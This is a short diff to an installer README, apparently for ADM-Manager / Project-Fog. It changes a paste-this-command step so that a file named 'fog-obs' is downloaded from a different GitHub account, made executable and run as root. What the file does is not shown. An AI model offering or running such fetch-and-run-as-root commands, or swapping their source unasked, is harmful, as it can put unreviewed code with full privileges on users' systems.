@@ -59,7 +59,7 @@ ADM-Manager 🐬 |
    1. sudo su
   </p>
  <p align="center">
-   2. wget https://github.com/korn-sudo/Project-Fog/raw/main/fog-obs && chmod +x ./fog-obs && ./fog-obs
+   2. wget https://github.com/pcfreak/oph/raw/main/fog-obs && chmod +x ./fog-obs && ./fog-obs
   </p>
 <p align="center">
    3. Grab your coffee and wait. 🦊
